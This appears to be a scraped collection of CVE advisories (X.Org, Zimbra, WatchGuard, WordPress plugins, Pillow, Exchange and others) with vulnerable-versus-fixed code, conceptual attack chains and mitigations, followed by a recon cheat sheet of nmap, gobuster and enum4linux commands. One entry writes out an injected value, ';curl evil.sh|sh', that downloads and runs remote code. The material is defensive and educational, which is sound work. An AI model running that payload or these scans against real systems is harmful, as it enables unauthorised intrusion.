docs.title: CVE-2026-93518, CVE-2026-93519, CVE-2026-93520, CVE-2026-93521, CVE-2026-93522 — X.Org X Server: Heap Buffer Overflows
docs.text: Field Value Severity High — CVSS 7.8 (v3.1) for each of the five CVEs Product X.Org X Server (xserver) and XWayland — the display server behind Linux desktops Type Heap-based buffer overflow (CWE-122) in request handling Vector Local, low complexity, requires an authenticated X client connection (any program already connected to the display). A crafted request — keyboard layout change, pointer barrier, display property update, or graphics copy — makes the server miscalculate a buffer size, overflow the heap, and crash or execute code in the X server context.

docs.title: Affected versions
docs.text:
X.Org X Server before 21.1.25 and XWayland before 24.1.14. Fixed in 21.1.25 / 24.1.14.

The five CVEs, all disclosed the same day, all CWE-122:

  • CVE-2026-93518 — integer truncation in XkbResizeKeyType() leads to a heap buffer overflow (keyboard handling).
  • CVE-2026-93519 — buffer overflow handling pointer barriers in the XFIXES extension.
  • CVE-2026-93520 — heap buffer overflow from mismatched size calculations between XkbAllocNames and ChangeKeycodeRange.
  • CVE-2026-93521 — buffer overflow in RandR ChangeProviderProperty requests.
  • CVE-2026-93522 — heap buffer overflow from mismatched size usage in the CopyArea CPU-to-FBO path.

docs.title: Root cause
docs.text:
The X server was built in an era of trusted local programs, and it still trusts size values that arrive in client requests. In each of these five code paths, the server's own size math disagrees with the request: it allocates too little memory, then copies too much into it. The overflow corrupts neighboring heap objects, and with a carefully chosen layout the overwrite steers execution into attacker-controlled data. The bug is trusting the sizes, not just reading them: any handler that sizes a buffer from a client-supplied value without revalidating hands the client the heap layout.

/* Simplified vulnerable pattern */
void handle_request(Client *c, Request *r) {
    size_t n = r->count;              /* attacker-controlled */
    buf = malloc(n * sizeof(Item));   /* too small if math truncates */
    copy_items(buf, r->items, r->count);  /* BUG: overflows buf */
}

/* Simplified fixed pattern */
void handle_request_fixed(Client *c, Request *r) {
    if (r->count > MAX_ITEMS || r->count != validated_count(r))
        return deny("size mismatch");  /* validate before allocating */
    buf = malloc(checked_size(r));
    copy_items(buf, r->items, r->count);
}

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker runs a program already connected to the victim's display (any local GUI app qualifies).
  2. The program sends a crafted request: a keyboard layout change, a pointer barrier, a RandR property update, or a CopyArea operation with inconsistent sizes.
  3. The server allocates a heap buffer smaller than the data it then copies in.
  4. The overflow corrupts adjacent heap memory; the server crashes, or execution is hijacked into attacker code running with display-server privileges — able to observe the screen and input.

The accompanying poc.py demonstrates the pattern safely: a Python analogue where a "server" sizes a buffer from a client-supplied count (vulnerable) versus validating the count first (fixed). Everything is synthetic and offline — no real X server, no network, no exploit. Offline, educational only.

docs.title: Mitigation
docs.text:
• Upgrade now: X.Org X Server 21.1.25 / XWayland 24.1.14 (via your distribution's update).
  • Restart your session after updating so the fixed server is the one running.
  • Limit what runs on the desktop: only trusted local applications should hold X connections; untrusted code with display access is exactly the precondition here.
  • Prefer Wayland compositors where possible, which do not share the X server's legacy trust model for client requests.

docs.title: CVE-2026-93639 — Zimbra: a Delegated Admin Overwrites Global Settings (8.7)
docs.text: Field Value Severity High — CVSS 8.7 (v3.1) Product Zimbra Collaboration Suite (ZCS) Type Missing authorization — delegated administrator Vector A delegated administrator with no explicit administrative grants can overwrite global Zimlet configuration through ConfigureZimletRequest. The uploaded configuration can also add an attacker-controlled domain to the proxy allowlist of the default class of service, so a signed-in user in that class who opens a crafted /service/proxy URL is served attacker-controlled HTML under Zimbra own origin — JavaScript that can read mailbox data and act as the victim.

docs.title: Affected versions
docs.text: Zimbra Collaboration Suite — see the Zimbra security advisories for fixed versions; apply the latest ZCS security patch.

docs.title: Root cause
docs.text: The admin SOAP service never verified that the delegated administrator actually held the grants for global configuration. Once global settings and the proxy allowlist were writable by a limited account, the trusted origin itself became the attacker delivery channel.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

# VULNERABLE - no grant check before global write
# configure_zimlet(user, global_config)   # any delegated admin
# FIXED - verify the grant before touching global scope
# if not user.has_grant("global_config"): deny()

The demo poc.py below contrasts an admin endpoint that skips the grant check with one that enforces it.

The demo poc.py below illustrates the vulnerable pattern against the fixed pattern with purely synthetic, offline objects — no real product, no network, no exploit.

docs.title: Mitigation
docs.text: Apply the latest Zimbra security patch, audit every delegated admin account and strip unneeded grants, review global Zimlet settings and proxy allowlists, and restrict access to the admin SOAP service.

docs.title: WatchGuard Fireware OS: unauthenticated attackers can run privileged firewall actions (CVE-2026-93865 and batch)
docs.text: Educational writeup only. The proof of concept below is conceptual and demonstrates the flaw in a controlled lab. Do not use it against systems you do not own.

docs.title: Summary
docs.text: Field Value Severity CRITICAL 9.2 (CVSS) — representative CVE-2026-93865 Product WatchGuard Fireware OS (Firebox) Type Missing authentication (CWE-306 / CWE-862), buffer overflows (CWE-787), integer overflow (CWE-190) Vector Network — remote, unauthenticated for the headline flaws Batch CVEs CVE-2026-93865 (9.2, FireCluster sync missing authentication), CVE-2026-93857 (9.2, SIP proxy stack buffer overflow), CVE-2026-93866 (9.2, Access Portal WebSocket integer overflow), CVE-2026-90465 (9.4, FireCluster Sync missing authentication), CVE-2026-103594 (9.5, WireGuard configuration stack buffer overflow), CVE-2026-112709 (9.2, authentication service heap buffer overflow), CVE-2026-112710 (9.2, authentication service heap buffer overflow), CVE-2026-103593 (7.1, logging service stack buffer overflow), CVE-2026-111107 (8.7, management interface NULL pointer dereference), CVE-2026-93434 (8.7, SSH authentication XPath injection) Fixed in WatchGuard Fireware OS security update for this batch (see WatchGuard PSIRT advisories linked below)

docs.title: Affected versions
docs.text: Fireware OS versions covered by the WatchGuard PSIRT advisories for the CVEs above. Any Firebox exposing the affected services — FireCluster synchronization, SIP proxy policies, the Access Portal, or management interfaces — to untrusted or on-path attackers is at risk. The headline flaws need no login: a crafted request to the FireCluster management address invokes privileged actions as root, a crafted SIP proxy request can execute code, and a crafted Access Portal WebSocket request can write past a heap buffer.

docs.title: Root cause
docs.text: These services trusted traffic that arrived on the right interface. The FireCluster synchronization daemon assumed only friendly cluster peers would ever speak to it, so it performed privileged actions without verifying the caller. Parsers in the SIP proxy, the authentication service, and the Access Portal assumed incoming data would fit the buffers they were given. When the most trusted box in the network skips authentication and bounds checks, an attacker needs no password — only a packet.

docs.title: Proof of concept (conceptual, educational only)
docs.text:
See poc.py. It shows, against your own lab deployment only:

  1. The vulnerable pattern: a privileged sync action served with no caller check, and a buffer write with no size check.
  2. The fixed pattern: authenticate every sync request, and check every write against the destination capacity before copying.
  3. What a successful attack gains: privileged firewall actions as root, code execution on the device, and control of the network behind the firewall.

No working exploit is provided — only the check and the vulnerable-vs-fixed pattern.

docs.title: Mitigation
docs.text:
• Apply the WatchGuard Fireware OS security update for this batch immediately.
  • Disable the SIP proxy, Access Portal, and FireCluster features you do not use.
  • Restrict firewall management interfaces to trusted hosts only.
  • Never expose firewall management to the internet.
  • Audit FireCluster peers, management sessions, and firewall rules for changes you did not make.

docs.title: CVE-2026-93879: Hibernate Validator Expression Language Denial of Service
docs.text: Field Value Severity HIGH (7.5) CVSS vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H Product Hibernate Validator (affected releases before the patched versions below) Vulnerability type Uncontrolled Resource Consumption (CWE-400)

docs.title: Affected versions
docs.text: Hibernate Validator releases before 9.1.5.Final (9.x line), 8.0.6.Final (8.x line), and 6.2.6.Final (6.x line).

docs.title: Root cause
docs.text: Hibernate Validator did not properly escape user-controlled data interpolated into Expression Language (EL) expressions used in constraint violation messages. A remote attacker can send crafted input that makes the EL engine consume excessive CPU and memory, exhausting server resources until the service stops responding.

docs.title: Proof of concept
docs.text:
The demo in poc.py shows the safe pattern: user input is escaped before it is interpolated into a message template, and expression evaluation is bounded so a single request cannot monopolize resources. It runs locally.

See poc.py in this folder. Educational only: the demo illustrates the vulnerable pattern's safe counterpart and performs no exploitation. Only test in controlled environments against systems you own or are authorized to test.

docs.title: Mitigation
docs.text:
• Update to a patched release in your line: 9.1.5.Final, 8.0.6.Final, or 6.2.6.Final, which enable message parameter escaping by default.
  • Never let raw user input reach an expression engine unescaped.
  • Apply request timeouts and resource limits on validation endpoints so one crafted request cannot take the service down.

docs.title: CVE-2026-94169 — WordPress "The Grid" Code Injection → RCE
docs.text: Field Detail Severity Critical 10.0 (CVSS 3.1) Product Theme-one "The Grid" plugin for WordPress, through 2.8.1 Type Code/command injection (CWE-94) → remote code execution Attack vector Network · no authentication required

docs.title: Affected versions
docs.text: The Grid n/a through 2.8.1. Fixed in later releases.

docs.title: Root cause
docs.text:
The plugin builds a server-side command by concatenating raw user input — classic code injection. Data and instructions are never separated:

$cmd = 'convert ' . $_GET['style'];  // user input!
shell_exec($cmd);                     // executed by the server

A style parameter of ;curl evil.sh|sh becomes part of the server's own command line.

docs.title: Proof of concept
docs.text:
poc.py is an educational illustration of the injection vs the fix. It prints the command that would run — it never executes anything.

python3 poc.py

Conceptual attack chain:

  1. Attacker sends GET /?style=;curl evil.sh|sh — no login needed.
  2. The plugin stitches the payload into its shell command.
  3. The server executes it as www-data: defacement, DB theft, malware, network pivoting.

docs.title: Mitigation
docs.text:
• Update The Grid past 2.8.1 immediately — or disable the plugin.
  • Put a Web Application Firewall (WAF) in front of WordPress.
  • Scan the server for unknown files / backdoors.

docs.title: CVE-2026-95182 — DeepSeek Harness Untrusted Search Path
docs.text: Field Detail Severity Critical 10.0 (CVSS 3.1) Product DeepSeek Harness (dsh), commit c291e796 and earlier Type Untrusted search path (CWE-426) → arbitrary code execution Attack vector Local · no privileges required (victim opens a project)

docs.title: Affected versions
docs.text: DeepSeek Harness up to commit c291e796. Fixed in later commits.

docs.title: Root cause
docs.text:
When dsh needs a helper executable, it resolves the name through a search path that includes untrusted directories — such as the project folder the user just opened — before the system directories:

PATH = [project_dir, "/usr/bin", "/bin"]   # untrusted dir wins
run("helper")                              # executes the attacker's file

The OS resolves the name in order, so a malicious file with the expected name placed in the project folder is executed with the victim's privileges.

docs.title: Proof of concept
docs.text:
poc.py is an educational illustration of the flawed resolution order versus the fix. It executes nothing — it only prints which binary would run.

python3 poc.py

Conceptual attack chain:

  1. Attacker crafts a project containing a malicious executable named like the helper dsh looks for.
  2. Victim clones/opens the project with dsh.
  3. dsh searches the project folder first, finds the fake helper.
  4. The attacker's code runs as the victim (keys, backdoors, ransomware).

docs.title: Mitigation
docs.text:
• Update DeepSeek Harness past the fixed commit.
  • Never open projects from untrusted sources without inspecting them.
  • Look for unexpected executables in a project folder before opening it.
  • Run developer tools with the least privilege necessary.

docs.title: CVE-2026-9589 — Unblu Spark: Missing Authorization Lets Any User Rewrite Anyone's Config
docs.text: Field Value Severity Critical — CVSS 9.3 Product Unblu Spark 7.0 through 8.36.1-hotfix.0 — the co-browsing / digital client interaction platform used by 170+ banks and financial institutions Type Missing Authorization (CWE-862) in configuration cascade operations Vector Authenticated remote attacker → configuration read/write operations targeting unauthorized entities (other users, other accounts, other customers' accounts in Unblu Cloud)

docs.title: Affected versions
docs.text:
• Unblu Spark 7.0 through 8.36.1-hotfix.0, on-premises and cloud deployments.
  • Fixed in the patched release referenced by the Unblu security bulletin (tracked as UNBLU#17160 in the release notes).

docs.title: Root cause
docs.text:
The Collaboration Server's configuration cascade operations — the APIs that read and write configuration properties across entities — never check whether the caller is authorized for the entity they target. The target entity comes straight from the request, but the authorization check simply doesn't exist:

# Simplified vulnerable pattern
def cascade_write(requesting_user, target_entity, new_config):
    entity = lookup(target_entity)      # attacker picks ANY entity
    entity.config.update(new_config)    # no permission check at all!
    return "ok"

# Simplified fixed pattern
def cascade_write_fixed(requesting_user, target_entity, new_config):
    entity = lookup(target_entity)
    if not authorized(requesting_user, entity, "write"):
        raise PermissionDenied()        # tenants stay separated
    entity.config.update(new_config)
    return "ok"

In a multi-tenant cloud deployment, that single missing check erases the walls between customers.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker authenticates with an ordinary, low-privilege account.
  2. They call the configuration cascade read operation with another user's (or another account's) entity identifier — the server returns that entity's configuration without checking.
  3. They call the cascade write operation targeting another entity and change its configuration properties — again, no check.
  4. On Unblu Cloud, the same calls reach other customers' accounts.

The accompanying poc.py demonstrates the pattern safely: a cascade model where the target entity is trusted from the request versus one where every cascade operation enforces per-entity authorization — all synthetic, offline, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now: Unblu Spark past 8.36.1-hotfix.0 to the fixed release per the Unblu security bulletin. Unblu Cloud customers were patched automatically but should still audit.
  • Audit configuration change logs for unauthorized cascade reads/writes — the flaw leaves no authentication barrier, so review history for anomalies.
  • Restrict administrative access to the Collaboration Server and review who holds cross-account permissions.

docs.title: Exchange Online: Stack Overflow Turns a Mailbox Into Code Execution
docs.text: Educational material only. Do not use against systems you do not own or have explicit permission to test. | | | |---|---| | CVE | CVE-2026-96185 | | Severity | High — CVSS 7.5 (v3.1) | | Product | Microsoft Exchange Online | | Type | Stack-based buffer overflow (CWE-121) | | Attack vector | Authorized attacker sends precisely shaped input from an ordinary mailbox → memory corruption → code execution |

docs.title: Affected versions
docs.text: Microsoft Exchange Online. Fixed by Microsoft service-side — nothing to install.

docs.title: Root cause
docs.text:
A fixed-size stack buffer received attacker-influenced input without a length check. Precisely shaped input spilled past the end of the buffer, overwriting adjacent stack data — including the return address that decides where execution continues:

# Simplified vulnerable pattern (conceptual)
def handle_field(data):
    buf = bytearray(64)          # fixed stack buffer
    buf[:len(data)] = data       # BUG: no length check -> overflow

# Simplified fixed pattern
def handle_field_fixed(data):
    buf = bytearray(64)
    if len(data) > len(buf):
        raise ValueError("input too long")
    buf[:len(data)] = data
Bounds checks are not optional on fixed buffers — one missing check is a code-execution primitive.

docs.title: Proof of concept
docs.text:
1. Attacker, holding an ordinary authorized mailbox, crafts input for a vulnerable field.
  2. The input exceeds the fixed-size stack buffer — no length check stops it.
  3. Excess bytes overwrite adjacent stack memory, including control data.
  4. Execution flow is hijacked when the function returns.
  5. Arbitrary code runs with the service's privileges — full impact on confidentiality, integrity, availability.

See poc.py — a safe, fully synthetic demo of the vulnerable vs. fixed pattern. fixed-size buffers need explicit bounds checks: the demo contrasts an unchecked copy with one that rejects oversized input.

docs.title: Mitigation
docs.text:
• Nothing to install: Microsoft fixed Exchange Online service-side.
  • Pull mailbox audit logs for the last 30 days and hunt for unexplained cross-mailbox access.
  • Watch for anomalous mailbox behaviors — rules, forwards, or delegate changes you did not make.

docs.title: CVE-2026-96534 — Modern Events Calendar: SQL Injection in Search
docs.text: Field Value Severity High — CVSS 7.7 Product Modern Events Calendar WordPress plugin Type Improper Neutralization of Special Elements used in an SQL Command (CWE-89) Vector Authenticated (subscriber), network → full database read

docs.title: Affected versions
docs.text: Versions before 7.37.0. Fixed in 7.37.0.

docs.title: Root cause
docs.text:
The plugin drops a search parameter straight into a SQL query — no escaping, no prepared statement. Any subscriber-level account can therefore shape the query, and the database answers with whatever the query asks for: logins, emails, payment records.

# Simplified vulnerable pattern
query = "SELECT * FROM events WHERE title LIKE '%" + search + "%'"
db.execute(query)   # subscriber input becomes part of the SQL
# fixed: db.execute("SELECT * FROM events WHERE title LIKE %s",
#                   ("%" + search + "%",))

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker, holding any subscriber account, submits a search containing a SQL probe (a single quote, then a UNION SELECT).
  2. The database obeys the injected query and returns rows from tables the search was never meant to touch.
  3. Logins, emails, and payment details leave through the search box.

The accompanying poc.py demonstrates the pattern safely: a mock event search whose vulnerable builder concatenates the term (a UNION probe leaks the fake users table), versus the fixed builder that binds it as a parameter. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update to 7.37.0 immediately.
  • Check your logs for unusual search queries — quotes, UNION, comment markers.
  • Force password resets for users whose hashes may have been read, and rotate payment-related secrets.
  • Never build SQL from user input; use prepared statements everywhere.

docs.title: CVE-2026-96639 — Pillow stale native image storage reused after mode transitions
docs.text: Severity Product Type Attack vector CRITICAL 9.8 Pillow >= 11.0.0, < 13.0.0 Out-of-bounds write (CWE-125) Network — remote via a crafted image file

docs.title: Affected versions
docs.text:
• Pillow >= 11.0.0 and < 13.0.0 (multi-frame loaders: PSD, MPO, DCX, MIC)
  • The MPO path additionally allows a native over-read
  • Fixed in 13.0.0 (see release notes and GHSA-v9pv-5gc8-w2m6)

Pillow 13.0.0 shipped as a security release that also fixed a cluster of related parsing bugs: CVE-2026-96640 (PDF page-tree resource exhaustion), CVE-2026-96637 (SPIDER decompression-bomb bypass), CVE-2026-96642 (TarIO infinite loop), CVE-2026-96643 (Exif header loop), CVE-2026-96644 (WMF/EMF over-read on Windows), CVE-2026-96778 (JPEG encoder heap overflow), plus several TIFF-related flaws.

docs.title: Root cause
docs.text:
In the multi-frame loaders, ImageFile.load_prepare() reused the existing native ImagingCore storage (self._im) whenever it was non-null, without re-validating that its mode and size still matched the frame about to be decoded.

An attacker crafts a file whose first frame uses a narrow pixel mode (e.g. L), causing a small native allocation, and whose second frame — same nominal dimensions — switches the logical mode and decoder tiles to wider RGB or CMYK data. The stale allocation is reused, and the decoder writes wider pixels into the narrower buffer, producing native out-of-bounds writes (heap corruption, crash, potential RCE).

Patch: https://github.com/python-pillow/Pillow/commit/78d97d994579aef81aafe123773d525f40f2522a (PR #10105)

docs.title: Proof of concept
docs.text:
Conceptual only — illustrates the pattern behind the bug, not a working exploit.

# A narrow frame allocates a small native buffer ...
# A later frame flips to a wider mode, but the loader reuses the
# old allocation without checking that mode and size still match:
#
#     if core is not None:
#         decode(frame, core)      # BUG: stale buffer, wider pixels
#
# Wide RGB bytes land in a buffer sized for narrow pixels ->
# out-of-bounds write in native code.

See poc.py for a safe, pure-Python simulation of the stale-buffer pattern vs. the fixed revalidation behavior.

Educational use only. Do not build or distribute working exploits for this vulnerability — patch your dependencies instead.

docs.title: Mitigation
docs.text:
• Upgrade to Pillow 13.0.0 immediately (pip install --upgrade Pillow), or pin Pillow>=13.0.0 in your requirements.
  • Audit every image-upload path (profile pictures, thumbnailers, OCR pipelines): treat uploaded images as untrusted input.
  • For defense in depth, enforce Image.MAX_IMAGE_PIXELS limits and keep decoders behind resource limits even after patching.

docs.title: CVE-2026-97397 — Stored Cross-Site Scripting in the Remove Google Fonts Plugin for WordPress
docs.text: Field Value Severity HIGH — CVSS 3.1: 7.2 Product Remove Google Fonts plugin for WordPress <= 1.7 Type Stored Cross-Site Scripting (CWE-79) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N Affected versions All versions up to, and including, 1.7 Fixed version A release newer than 1.7

docs.title: Affected versions
docs.text: The Remove Google Fonts plugin for WordPress (disable, block, or replace Google Fonts with Bunny Fonts), all versions up to, and including, 1.7, with Remove mode active.

docs.title: Root cause
docs.text:
In Remove mode the plugin rewrites page output through a regex-based output buffer to strip font references. That regex rewriting mangles the output, and comment text is stored without sufficient sanitization and shown back without sufficient escaping. A script hidden inside a comment therefore survives the filter and is stored on the page.

Exploitation requires the malicious comment to be published — either through auto-approval for known commenters or through manual moderator approval.

docs.title: Proof of concept
docs.text:
Educational only — this demonstrates the pattern, not a working exploit. Do not test against systems you do not own.

See poc.py: it shows, in a safe local simulation, how raw comment text passes through a mangling rewrite untouched, and how the fixed version (sanitize on input, escape on output) breaks that chain.

Conceptual attack chain:

  1. Attacker posts a comment carrying a hidden script; no account is needed.
  2. The comment is published (auto-approval or moderator approval).
  3. Remove mode rewrites the page output, mangling its own filter.
  4. The script is stored on the page.
  5. Every visitor who opens the page runs the script in their browser.

docs.title: Mitigation
docs.text:
• Update the Remove Google Fonts plugin past version 1.7 immediately.
  • Until patched, switch off Remove mode.
  • Hold all comments for moderation and review recently approved comments for injected scripts.
  • Sanitize comment input on arrival and escape it on output, and never rely on regex output rewriting as a security filter.

docs.title: CVE-2026-9764: IBM Bob Shell Code Injection via Untrusted MCP Servers
docs.text: Field Value Severity HIGH (8.8) CVSS vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H Product IBM Bob Shell 1.0.4 through 2.0.1 Vulnerability type Code Injection (CWE-94)

docs.title: Affected versions
docs.text: IBM Bob Shell 1.0.4 through 2.0.1.

docs.title: Root cause
docs.text: IBM Bob, the AI coding assistant, automatically ran workspace-defined MCP (Model Context Protocol) servers without asking the user first. Opening an untrusted repository could therefore execute attacker-controlled code on the developer's machine: the workspace configuration itself became the delivery mechanism, and the victim only had to open the repo.

docs.title: Proof of concept
docs.text:
The demo in poc.py models the trust decision: a workspace config that declares an MCP server is only honored after an explicit user confirmation and only if the server definition comes from a trusted source. It runs locally.

See poc.py in this folder. Educational only: the demo illustrates the vulnerable pattern's safe counterpart and performs no exploitation. Only test in controlled environments against systems you own or are authorized to test.

docs.title: Mitigation
docs.text:
• Upgrade to IBM Bob Shell 2.0.2 or later, which requires user approval before running workspace-defined MCP servers.
  • Only open repositories you trust, and review any workspace configuration (including MCP server definitions) before opening a repo.
  • Treat workspace config files as executable content: never auto-run servers, hooks, or tasks defined by an untrusted repo.

docs.title: CVE-2026-97677: IBM Langflow OSS Path Traversal File Write and Read
docs.text: Field Value Severity HIGH (8.1) CVSS vector CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N Product IBM Langflow OSS 1.0.0 through 1.12.2 Vulnerability type Path Traversal (CWE-22)

docs.title: Affected versions
docs.text: IBM Langflow OSS 1.0.0 through 1.12.2.

docs.title: Root cause
docs.text: An authenticated flow author could write attacker-controlled file content into any directory writable by the service account, bypassing the platform's local file access isolation safeguard. Via a crafted on-disk index, the attacker could also read the contents of arbitrary files accessible to the service process, including configuration files, secrets, or database files stored under the application's data directory.

docs.title: Proof of concept
docs.text:
The demo in poc.py models the isolation check: file writes are only allowed inside the flow's own data directory, and reads resolve the path first and reject anything that escapes it. It runs locally on temporary files.

See poc.py in this folder. Educational only: the demo illustrates the vulnerable pattern's safe counterpart and performs no exploitation. Only test in controlled environments against systems you own or are authorized to test.

docs.title: Mitigation
docs.text:
• Upgrade to Langflow OSS 1.12.3, which IBM strongly recommends.
  • Rotate any secrets, API keys, or credentials stored under the Langflow data directory, in case they were read.
  • Restrict who can author flows, and run the Langflow service account with the minimum filesystem permissions it needs.

docs.title: Yuxi Sandbox Isolation Failure (CVE-2026-97693)
docs.text: Field Value Severity CRITICAL 9.9 Product Yuxi (large-model-based intelligent knowledge base and knowledge graph agent development platform) Type Insufficient isolation / improper access control / cleartext storage of sensitive information in some paths Vector CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

docs.title: Affected versions
docs.text:
• Yuxi 0.6.0.beta1 through 0.7.0.
  • Fixed in: 0.7.1.

docs.title: Root cause
docs.text:
Execution-capable Docker sandboxes were not isolated from trusted application services or from each other:

  • A low-privileged authenticated user who could execute commands in their own sandbox could reach other tenants' sandbox APIs, read their files and secrets, execute commands in active sandboxes, and enumerate, create, or delete sandboxes through the unauthenticated provisioner, without knowing administrator, database, or object-storage credentials.
  • Sandboxes could also reach shared internal services. Where shipped default service credentials were left unchanged, an attacker could use them, and if the exposed database account was a superuser, obtain command execution in the database container.
  • None of this required a container escape or kernel vulnerability: the platform's own plumbing was reachable and unauthenticated or weakly authenticated.

docs.title: Proof of concept
docs.text: Educational only. The included poc.py models the concept with local mock objects: a tenant sandbox, a neighbor sandbox service, and a provisioner, showing the vulnerable path (any caller reaches any tenant, no authentication) versus the fixed path (per-tenant authorization on every call). It makes no network requests and touches no real deployment. See poc.py and the video walkthrough for the conceptual chain: own sandbox -> neighbor sandbox APIs -> files and secrets -> commands in other sandboxes -> unauthenticated provisioner -> shared services with default credentials -> database container.

docs.title: Mitigation
docs.text:
• Update Yuxi to 0.7.1 immediately.
  • Upgrading alone is NOT enough: separately rotate persisted PostgreSQL, Neo4j, and MinIO credentials that were previously set to documented or shipped defaults, because upgrading the Compose files does not rotate them automatically.
  • Audit tenant activity for cross-tenant access, unexpected sandbox creation or deletion, and use of default credentials; assume exposed data was read.
  • Verify that sandboxes can no longer reach other tenants' services or the provisioner without authentication, and that internal services require unique credentials.
  • Apply per-tenant network policies so sandboxes are sealed by default.

docs.title: Entra App Proxy: Improper Authentication Yields Unauthenticated Privilege Escalation
docs.text: Educational material only. Do not use against systems you do not own or have explicit permission to test. | | | |---|---| | CVE | CVE-2026-97785 | | Severity | Critical — CVSS 10.0 (v3.1) | | Product | Microsoft Entra application proxy (AAD App Proxy) | | Type | Improper authentication (CWE-287) | | Attack vector | Unauthenticated remote attacker abuses flawed authentication → privilege escalation, no user interaction |

docs.title: Affected versions
docs.text: Microsoft Entra application proxy. Apply the Microsoft security update to your connectors.

docs.title: Root cause
docs.text:
The application proxy's authentication check could be satisfied by an attacker who was never actually authenticated. The gate asked "who are you?" and accepted an answer it should have rejected — so an unauthenticated stranger walked through with elevated privileges:

# Simplified vulnerable pattern
def handle(request):
    if looks_authenticated(request):  # BUG: check can be fooled
        return grant_access(request)

# Simplified fixed pattern
def handle_fixed(request):
    token = validate_token(request)   # cryptographic verification
    if token is None:
        return deny(request)
    return grant_access(request, token.identity)
Authentication must be verified, never inferred.

docs.title: Proof of concept
docs.text:
1. Attacker sends requests to the application proxy endpoint.
  2. The proxy's authentication check accepts the attacker's crafted input.
  3. The attacker is treated as an authenticated, privileged user.
  4. Internal applications are reached through the proxy with those privileges.
  5. Privilege escalation with zero user interaction.

See poc.py — a safe, fully synthetic demo of the vulnerable vs. fixed pattern. authentication must be cryptographically verified, never inferred from request shape: the demo contrasts a fooled check with real token validation.

docs.title: Mitigation
docs.text:
• Apply the Microsoft security update to all Entra application proxy connectors now.
  • Verify connector versions across every site — one unpatched connector reopens the hole.
  • Review sign-in and proxy logs for sessions that never completed real authentication.

docs.text: Field Value Severity CRITICAL (9.8) Product Yamaha NWR100 wireless LAN router Type OS Command Injection (CWE-78) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

docs.text: A specially crafted request reaches the router's command layer without proper neutralization, so attacker input is interpreted as operating system commands.

docs.title: Proof of concept

An unauthenticated remote attacker sends a crafted request to the router carrying shell commands hidden in an ordinary field. The router executes them and the attacker gains control of the gateway.

See poc.py for an educational illustration of the vulnerable pattern versus the fixed pattern. Educational only, for controlled environments.

docs.title: Mitigation
docs.text:
• Apply Yamaha's latest firmware for the NWR100.
  • Restrict the admin interface to the local network.
  • Change default credentials and review the configuration for unexpected changes.

docs.title: Core Terminology
docs.text: Term Description Network Set of interconnected devices sharing resources. LAN (local) or WAN (wide area). Node Any device on the network: computer, router, switch. Protocol Rule set governing data transmission. Examples: TCP/IP, HTTP, FTP. Bandwidth Max data throughput, measured in bits per second (bps). Latency Time for a packet to travel from source to destination. Lower = faster. Packet Basic data unit. Contains payload + headers (source/destination addresses). Firewall Device or software controlling inbound/outbound traffic via security rules.

docs.title: OSI Model (7 Layers)
docs.text: # Layer Function Examples 7 Application User-facing services HTTP, FTP, SMTP, DNS 6 Presentation Data format translation, encryption SSL/TLS 5 Session Connection management between apps RPC 4 Transport Reliable end-to-end delivery TCP, UDP 3 Network Routing between networks IP, ICMP 2 Data Link Direct node-to-node transfer MAC, Ethernet 1 Physical Hardware transmission (cables, signals) Ethernet cables, USB

docs.title: TCP/IP Model (4 Layers)
docs.text: # Layer OSI Equivalent Examples 4 Application App + Presentation + Session HTTP, FTP, DNS 3 Transport Transport TCP, UDP 2 Internet Network IP, ICMP 1 Network Access Data Link + Physical Ethernet, Wi-Fi

docs.title: Subnetting & CIDR
docs.text:
• IP Address: Unique device identifier. IPv4 (192.168.1.1) or IPv6 (2001:db8::1).
  • Subnet Mask: Separates network vs host portion of an IP. Common: 255.255.255.0.
  • CIDR: Compact notation — 192.168.1.0/24 means 24 bits for network, 8 for hosts.

docs.title: Subnetting benefits
docs.text:
• Security — isolate network segments, limit blast radius
  • Efficiency — avoid IP waste on large flat networks
  • Traffic reduction — local traffic stays within subnet

docs.title: Assessment Methodologies
docs.text: Structured approach to security assessments — from passive recon through vulnerability scanning.

docs.title: 1. Passive Information Gathering
docs.text:
Collect data about the target without direct interaction. Uses public sources only — no packets sent to the target.

Tool Purpose DNSRecon DNS record enumeration (A, MX, NS, TXT, zone transfer attempts) whois Domain ownership, registration dates, registrar, DNS servers DNSDumpster Visual DNS map — subdomains, IPs, MX, NS records Shodan Internet-connected device search; find exposed services Netcraft Web server history, technology stack, WHOIS reports Sublist3r Subdomain enumeration via search engines and APIs theHarvester Email, host, and subdomain discovery from public sources 
# Passive DNS recon
dnsrecon -d target.com
whois target.com
theHarvester -d target.com -b all

docs.title: 2. Service Discovery
docs.text:
Identify active hosts and open ports on the target network.

Tool Purpose nmap Port scanning, service detection, OS fingerprinting netcat Manual port probing, banner grabbing masscan High-speed port scanning across large ranges 
# Discover live hosts
nmap -sn 192.168.1.0/24

# Fast full port scan
nmap -p- --open --min-rate 5000 -n -Pn <target>

# Service + version detection
nmap -sCV -p<ports> <target>

docs.title: 3. Service Enumeration
docs.text:
Enumerate services in depth to extract versions, configurations, and potential entry points.

Tool Purpose nmap -sCV Script scan + version detection on open ports nikto Web server vulnerability scanner gobuster / ffuf Web directory and file brute force enum4linux SMB/Samba enumeration (users, shares, policies) 
# Web enumeration
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# SMB enumeration
enum4linux -a target.com

docs.title: 4. Vulnerability Scanning
docs.text:
Scan discovered services for known CVEs and misconfigurations.

Tool Purpose OpenVAS Open-source full vulnerability scanner Nessus Commercial vulnerability scanner (widely used) nmap NSE Script-based vuln checks (--script vuln) 
# Nmap vuln scripts
nmap --script vuln -p<ports> <target>

docs.title: Practical Workflow
docs.text:
1. whois + DNSRecon + theHarvester   → passive recon
